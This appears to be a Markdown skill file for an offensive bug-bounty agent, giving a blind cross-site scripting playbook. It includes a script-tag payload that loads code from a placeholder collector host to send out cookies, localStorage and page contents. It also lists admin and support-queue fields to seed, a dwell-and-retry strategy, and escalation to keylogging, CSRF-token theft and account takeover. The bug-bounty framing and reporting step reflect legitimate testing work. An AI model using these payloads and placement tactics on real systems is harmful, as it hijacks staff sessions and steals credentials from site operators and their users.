---
name: attack-xss-blind
description: "Blind XSS — callback collectors (XSS Hunter style), payload placement in admin panels/support queues, delivery and dwell strategy"
category: "client-side"
version: "1.0"
author: "bountyreper-official"
tags:
  - xss
  - blind
  - callback
  - admin
tech_stack:
  - web
cwe_ids:
  - CWE-79
chains_with:
  - attack-xss
  - attack-account-takeover
prerequisites:
  - attack-xss
---

# Blind XSS

## Objective

You cannot see where (or whether) the payload fires — typically it executes in an
admin's browser hours or days after injection. The whole methodology is: place
self-exfiltrating payloads everywhere, wait for a callback, then escalate into an ATO.

## Methodology

### 1. Set up the collector BEFORE any injection

- Burp Collaborator (has HTTP by default) or an XSS hunter-style collector over HTTPS.
  All `fetch` callbacks must carry TLS — browsers block mixed content.
- Payload template (single line, self-contained):

```js
<script src=https://collector.tld/x.js></script>
```

Collector script should exfil: URL, cookies (document.cookie), DOM screenshot/IP, and
localStorage keys, then beacon once (avoid loops).

### 2. Injection surface (admin-facing stores — the money is here)

Priority:
- **Support/contact forms + live chat** ("your message will be reviewed by our staff")
- **Support ticket replies / ticket IDs in URL fragments** — the agent's browser
  previews YOUR URL fragment
- Abuse/violation report text — attack-reviewer browser
- Billing notes, corporate signup fields (company name rendered in CRM)
- User-agent / referer-based blocks that hit admin log viewers
- DMCA/trust&abuse queues (bounty platforms' own triage panels are famous here)

### 3. Payload placement strategy

- POST the payload in every free-text field of each form, UNIQUE tag per form so the
  callback tells you exactly which surface fired
- For login forms: payload in email/username field on failed login (admin audit view)
- When a form validates input: register an account with an XSS'd display name, then
  trigger a contact/admin-review flow
- Interstitial previews (share cards, email digests): trigger each once — they render
  server-side for crawlers sometimes

### 4. Dwell & retry

```text
inject → wait 24-72h → re-inject on failed surface with a variant tag
```

Blind payloads are cheap: seed 2-3 variants (one `<script>` src, one `onerror` via
`img`, one event-handler) per surface. Callbacks without any execution confirm storage
but not execution — keep the tag mapping exact.

### 5. On callback

1. Confirm the cookies include a live session token (document.cookie) — that is impact
2. Read location.pathname to learn exactly which panel executed it
3. Escalate: capture CSRF token, list modules, then either keylog or fetch sensitive
   endpoints — with attack-account-takeover as the pairing skill
4. Report: storage point (URL of the form), callback evidence (collector log +
   cross-reference to the tagged field), admin surface (pathname), impact proof

## Notes

- A callback with no sensitive data ≠ no bug. "Executed in /admin/reviews with
  HttpOnly cookies" is still high — the DOM readout is the payload
- Never inject blind payloads into customer-visible fields of third parties; blind is
  for review-staff flows the payload owner wouldn't see otherwise
